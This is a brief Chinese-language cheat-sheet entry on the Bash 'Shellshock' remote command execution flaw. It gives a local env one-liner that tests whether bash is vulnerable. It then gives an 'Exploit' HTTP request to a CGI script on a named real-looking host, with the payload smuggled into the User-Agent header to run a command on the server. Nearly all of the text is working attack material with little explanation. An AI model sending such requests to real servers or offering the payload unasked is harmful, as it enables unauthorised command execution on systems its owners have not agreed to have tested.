### Bash远程解析命令执行漏洞
测试方法
```shell
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

Exploit:
```http
GET /cgi-bin/test.cgi HTTP/1.1 
Host: help.tenpay.com 
User-Agent: () { :;}; touch /tmp/hack
Accept: */*
Referer: http://www.example.com
Connection: keep-alive
```
